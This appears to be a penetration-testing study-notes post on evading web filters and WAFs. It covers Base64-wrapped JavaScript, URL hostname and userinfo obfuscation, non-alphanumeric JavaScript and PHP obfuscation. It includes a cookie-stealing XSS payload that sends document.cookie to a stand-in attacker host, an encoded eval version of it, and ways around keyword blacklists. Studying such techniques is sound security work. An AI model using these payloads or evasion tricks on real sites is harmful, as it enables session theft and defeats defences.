---
title: "2 - Evasion Basics"
classes: single
header:  
  teaser: /assets/images/posts/ewptx/ewptx-teaser3.jpg
  overlay_image: /assets/images/main/header4.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Some basic techniques for evasion in WEB APP scenario"
description: "Base64 encoding, obfuscations, compressing, escapes and More"
categories:
  - notes
  - ewptx
tags:
  - advanced
  - pentest
  - web
  - bypass
toc: true
---

## Base64 Encoding Evasion
- Lets suppose that we want to evade a system that inspects Javascript code For specific keywords like eval, alert, prompt, document.cookie, or other potential malicious strings.
- A possible way to escapse these kinds of filters is by using Base64 encoding.

### Cookie Stealer
To steal cookies, not marked as HttpOnly is relatively easy and we commonly use this JavaScript payload:
```js
location.href = 'http://evilpath;com/?c='+escape(document.cookie)''
```

- however often the document.cookie keyword may be detected and blocked

Use Base64 encoding, we can hide document.cookie code translating the attack vector into:
```js
eval(atob(bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGg7Y29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=))
```

- perhaps the eval function is blacklisted too, so lets see alternatives:

in Javascript:
```js
[].constructor.constructor("code")() //where code equals 'atob(<base64 script>)'
```

Other valid methods are:
```js
setTimeout("code") #all browsers
setInterval("code") #all browsers
setImmediate("code")#IE10+
Function("code)"() #all browsers
```

## URI Obfuscation Techniques
URI (Uniform (local/remote) Resource Identifier

- It can not only be handy in byṕassing a filtered system, but also to shorten the vector to respect a length limit.

### URL Shortening
Its a technique in which a URL may be shorter in length and still direct to the required page.

  → https://my.ine.com

  → https://tinyurl.com/32f32v49

Running your own URL shortener is simple and there are multiple services and libraries that allow you to start the service easily, such as:

  → http://yourls.org/   //free

  → https://bitly.com/   //paid

### Preview
Some shortening services implement their technique to show the preview or some information abou the shortened link

bitly uses + signal:
```
- tinyurl uses preview.<url>
- moreover: http://security.thejoshmeister.com/2009/04/how-to-preview-shortened-urls-tinyurl.html
```

There are services that do not provide this feature, such as:

- http://t.co/ //used by twitter

For this kind of service, online solutions exists:

- http://www.toolsvoid.com/unshorten-url
- http://longurl.org/expand

### cURL Link Resolver
U can do it manually:
```bash
curl -I <short url>
```

## URL Hostname Obfuscation
- normally URLs are used in formats like:

   → https://hack.me/test

- but RFC 
- RFC 3986 tells us that the these are also valid URLs:
- https://hack.me:443
- https://_[this_is_valid]_@hack.me

We want to obfuscate the Authority component of a URI:
foo://example.com:8042/over/there?name=ferret#nose

|scheme| authority       | path      | query     | fragment|

The Authority component is structured as follows:
```
[ userinfo "@" ] host [ ":" port ]

# other than the port subcomponent, we can play with the userinfo and host.
```

### Obfuscating with Userinfo
The userinfo subcomponent is used For authentication.
If credentials are required to access a resource, they can be included here, and the login will be automatic:
```php
http://'username:password'@www.I-want-login.com/protected_path

# if the page requires NO authentication, the subcomponent text is ignored by both browser and server.
```

Example:
- https://www.google.com@hack.me/t/xss

> hack.me does not implement this kind of authentication and will ignore the www.google.com part (userinfo)

In the userinfo subcomponent, Unicode is allowed, therefore, it does not need other additional clarifications if we want add signals or letter of other languages.

> not all browser support this obfuscation technique. Firefox and Opera show alert messages.

![Alt text](/assets/images/posts/ewptx/46.png){: .align-center}

![Alt text](/assets/images/posts/ewptx/45.png){: .align-center}

### Obfuscating with Host
Internet names are translated to IP addresses. But there are other ways to represent the same **number**, such as: *Dword*, *Octal*, *Hexadecimal*.

![Alt text](/assets/images/posts/ewptx/47.png){: .align-center}

#### Dword - google.com
Double Word is known as Integer IP. IP is translated to an equivalent 16bit number.
```
google.com > 216.58.218.78 > http://3627734862
```

#### Octal - google.com
```
google.com > 216.58.218.78 > http://0330.0072.0327.0116
```

> we can also **feed** each number by adding leading zeroes without break the original value

#### Hexadecimal - google.com
```
http://0xd83ada4e or http://0xd8.0x3a.0xda.0x4e
```

> its also possible to add zeroes like **0x000000d8 ...**

#### Hybrid
- these are the basic techniques, however, its also possible to mix these and create a hybrid

- this tool apply all the techniques discussed

→ http://www.silisoftware.com/tools/ipconverter.php



## Java Obfuscation Techniques

### Non-Alphanumeric
Its way to encode Javascript code by using only non-alphanumeric characters.

### String Casting
```java
"" + 1234 or 1234 + "" # returns "1234"
[] + 1234 or 1234 + [] # returns "1234"
x = "hello"
[1,"a",x] # returns [1, "a", "hello"]
[1,"a",x]+""  # returns "1, a, hello"
```

### Booleans
There are many ways to return a Boolean value using non-alphanumeric characters:

| False  | True  |
| ![ ]    | !![ ]  |
| !{ }    | !!{ }  |
| !!" "   | !" "   |
| [ ]=={ } | [ ]==""|

To extract the true or false string:
```
[!![ ]]+"" # returns 'true'
[![ ]]+""  # returns 'false'
```

### Numbers
- Can be created. true is 1 and false is 0;
- to generate 1 we can do true+false and 2 true+true... etc

Examples: number zero **0**:

| +""    | +[ ]    | ![ ]+![ ]  |
| -""    | -[ ]    | ![ ]+!{ }  |
| -+-+"" | -+-+[ ] | ![ ]+!!"" |

![Alt text](/assets/images/posts/ewptx/48.png){: .align-center}

### String
How to generate custom strings. For example if we wanna generate the **alert** string, we need to generate each character separately and then put them together.

- Generate **alert** string

We need to use the string output of native JavaScript objects and extract the characters required.
Example:
```
_={}+[] # is "[object Object]"
[]/[]+"" # is "NaN"
!![]/![]+"" # is "Infinity"
```

So to extract the alpha char **a** we use the Nan String and acces the position 1:
```
([]/[]+"")[![]+!![]] #"a" cause string can be accessed like arrays
("NaN")[1]
```

The remaining alpha characters can be generated using the following messages:
```
a - "Nan", fAlse
l - faLse
e - truE. falsE or [objEct ObjEct]
r - tRue
t - True or infiniTy
```

### Encoding
Based on this technique:
- JJencode = http://utf-8.jp/public/jjencode.html
- Aaencode = http://utf-8.jp/public/aaencode.html
- JSFuck   = http://www.jsfuck.com/

→ https://github.com/aemkei/jsfuck/blob/master/jsfuck.js

![Alt text](/assets/images/posts/ewptx/49.png){: .align-center}

### JavaScript Compressing
To make JavaScript run faster, developers often use tools that compile JavaScript into more compact and higher performing code.
By using these tools, its also possible to obfuscate code and evade detection. This is what we are going to be looking For in this chapter.

### Minifying
The process of minifying JavaScript code is by removing all unnecessary characters without changing the functionality of the original code.
Basically, all characters that are used to add readability to the code is removed. These characters are ignored by the interpreter. Examples of these are: whitespaces, new line, comments.
Some tools:
```
Closure compiler - https://developers.google.com/closure/compiler/
YUICompressor    - http://yui.github.io/yuicompressor/
JSMin            - http://crockford.com/javascript/jsmin
Packer           - http://dean.edwards.name/packer/
```
#### Packing
A packer compresses the minified code by shortening variable names, functions and other operations.
In other words, it makes the code unreadable.



## PHP Obfuncations Techniques
**They ways of PHP obfuscation are infinite...**

- Basic Language Reference

### Type Juggling
PHP is a dynamically typed language. PHP does not require/support explicit type definition in variable declaration
Basically, we can declare the same variable and as we assign different values (string, int, etc) the type of the variable changes.
```php
$joke = "1"
$joke++;
$joke = "a string"
```
### Numerical Data Types
```php
$x = 'Giuseppe';
echo $x[0];    # decimal index     (0) > 'G'
echo $x[0001]; # octal index       (1) > 'i'
echo $x[0x02]; # hexadecimal index (2) > 'u'
echo $x[0b11]; # binary index      (3) > 's'
```

Access String / Integer Numbers

How the structure For integer literals are:

| Integer                                                 |
| decimal         | hexadecimal       | octal   | binary  |
| [1-9][0-9]* or 0| 0[xX][0-9a-fA-F]+ | 0[0-7]+ | 0b[01]+ |

### Access String / Floating Numbers
```php
$x = 'Giuseppe';
echo $x[0.1];             # floating 0.1 casted to 0 (0) > 'G'
echo $x[.1e+1];           # exponential       (1) > 'i'
echo $x[0.2E+0000000001]; # long exponential  (2) > 'u'
echo $x[1e+1-1E-1-5.999]; # exponential and floating expression 3.901 casted to 3 > 's'
```

How the structure For floating literals are:

| Floating                                                                                   |
| LNUM   | DNUM                                   | EXPONENT_DNUM                            |
| [0-9]+ | ([0-9]*[\.]{LNUM}) | ({LNUM}[\.][0-9]*)| [+-]?(({DNUM} | {DNUM}) [eE][+-]? {LNUM})|

### Exotic Number Generation
```php
$x = 'Giuseppe';
echo $x[FALSE];                  // false is (0)                 > 'G'
echo $x[TRUE];                   // true is  (1)                 > 'i'
echo $x[count('hello')+true];    // count(object) is 1 (2)       > 'u'
echo $x["7rail"+"3er"-TRUE^0xA]; // PHP ignore trailing data (3) > 's'
```

- Its possible to use the casting functionalities PHP provides:
- http://www.php.net/manual/en/language.types.type-juggling.php#language.types.typecasting

```php
$x = 'Giuseppe';
echo $x[(int)"a common string"]; //(0) > 'G'
echo $x[(int)!0];       // True (1)    > 'i'
echo $x[(int)"2+1"];    // (2)         > 'u'
echo $x[(float)"3.11"]; // (3)         > 's'
echo $x[boolval(['.'])+(float)(int)array(0)+floatval('2.1+1.2=3.3')];
# true(1)+1+2.1=4.2 is (4)            > 'e'
```

### String Data Types
In PHP there are four different ways in which its possible to specify a string literal:
```php
- single quoted
- double quoted
- heredoc syntax
- nowdoc syntax (since PHP 5.3.0

# single quotes ' ' = variable and escape sequences For special chars are not expanded
# double quotes " " - they are expanded
```

![Alt text](/assets/images/posts/ewptx/50.png){: .align-center}


### Escapes
```php
\n                   # linefeed {LF or 0x04(10) in ASCII)
\r                   # carriage return (CR or 0x0D (13) in ASCII)
\t                   # horizontal tab (HT or 0x09(9) in ASCII)
\v                   # vertical tab (VT or 0x0B(11) in ASCII (since PHP 5.2.5)
\f                   # form feed (FF or 0x0C(12) in ASCII) (since PHP 5.2.5)
\\                   # backslash
\$                   # dollar sign
\"                   # double-quote
\[0-7]{1,3}          # sequence of chars matching the regex is a character in octal notation
\x[0-9A-Fa-f]{1,2}   # sequence matching is a hexadecimal notation
```

### Variable Parsing
```php
$s = "\x20"; //space char
echo "I$sLove Beer"; //theres no $sLove variable > I Beer
echo "I{$s}Love Beer";  > I Love Beer
echo "I${s}Love Beer";  > I Love Beer
echo "I{${s}}Love Beer";> I Love Beer
```

- Even arrays, object methods, class functions with numerical obfuscation are allowed.

### Heredoc and Nowdoc
- the preferred ways among command-line programmers
- The identifier must contain only alphanumeric characters and underscores. It must also start with a non-digit char or underscore, thereby making these examples still valid:

```php
echo <<<™[™&¨}]™⅞
 It works!
™⅞;
```

### Complex (curly) Syntax {...}
These are 3 different ways to define a variable named $Beer:
```php
${'Be'.'er'} = 'Club';
${'Be'.str_repeat('e',2).'r'} = 'Club';
${'Be'.str_repeat('e',2).@false./*.*/'r'} = 'Club';
```

Example of obfuscation:
```php

class beers{
  const lovely='rootbeer';
}
$rootbeer = 'Club'
echo "I'd like a {${beers::lovely}}!" //Id like a Club!
```

### Array Data Types
```php
$a = array(x=>123,xx=>456);
echo $a['x']; > 123 //normal
echo $a[x]; > 123  // index without quotes
echo $a["\x78"]; > 123 // hexa notation
echo $a['\170']; > 123 // octal notation
echo $a['x'.@false."\x78"]; > 456 //normal usage with padding and hex.notation
```

- A simple way to evade WAFs is to not only send your payload encrypted by using GET or POST, but also the key to decrypt via a custom header.


### Variable Variables
Its a way to set a variable name dynamically:
```php
$var # variable name
$$var # variable of $var variable

$x = 'love';
$$x = 'beer';

echo $x; love
echo $$x; beer
echo $love; beer
echo "$x ${$x}"; love beer
```

- its possible to add more dollar signs
- with this way, its easy to create code very hard to read.


### $_SERVER Superglobal
This is way to access the $_SERVER superglobal
```php
$$$$$$$$$$s = '_SERVER';
var_dump($$$$$$$$$$s); // null
var_dump($$$$$$$$$$$s); // string(7) "_SERVER"
var_dump($$$$$$$$$$$$s); // the $_SERVER array
```

PHP Non-Alphanumeric Code

- http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/
- http://www.thespanner.co.uk/2012/08/21/php-nonalpha-tutorial/

### Arithmetic Operators
- php follows perls convention:
- http://php.net/manual/en/language.operators.increment.php

- Character variable can only be incremented and not decremented. Only plain ASCII alphabets and digitsw (a-z, A-Z and 0-9) are supported.

### Bitwise Operators
Its possible to use bitwise operators on strings. example:
```php
echo A&B; //@
echo A|B; //C
echo A^B; //U+0003 END OF TEXT
echo ~A; //U+00BE Vulgar fraction three quarters
echo A<<B; //0
```

### Native PHP Objects
```php
$a = []; #create an empty array object
$a = $a.!![]; # convert the array to string "Array"
$_ = $__ = ![]&!![]; #true & false generates the int(0) "0"
$__++; #increment int (0) by one "1"
$_§ = $__§ = $a[$_]; # Access the position 0 of the 'array' string "A"
$__§++; #Get the next char after A "B"
echo $_§|$__§; #echos A|B "C"
```

```php
$_="{" #XOR char
echo ($_^"<").($_^">;").($_^"/"); #XOR magic > 'GET'
```

> hackvertor.co.uk - It has 2 options to encode PHP into non-alphanumeric code.
